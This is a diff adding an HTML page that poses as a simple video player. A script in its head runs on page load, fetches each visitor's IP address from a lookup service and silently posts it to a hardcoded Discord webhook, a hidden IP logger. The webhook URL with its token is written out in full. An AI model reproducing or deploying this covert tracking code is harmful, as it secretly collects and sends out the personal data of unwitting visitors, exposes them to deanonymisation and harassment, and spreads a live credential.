@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>My Website</title>
+  <style>
+    /* CSS styling for video player */
+    .video-player {
+      width: 640px;
+      height: 360px;
+      background: black;
+    }
+  </style>
+  <script>
+    // JavaScript code for logging users and sending IP to Discord webhook
+    window.onload = function() {
+      // Get user IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          // Send IP to Discord webhook
+          const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ ip })
+          });
+        });
+    };
+  </script>
+</head>
+<body>
+  <div class="video-player">
+    <!-- Replace 'VIDEO_URL' with the actual video link -->
+    <iframe src="VIDEO_URL" frameborder="0" allowfullscreen></iframe>
+  </div>
+</body>
+</html>
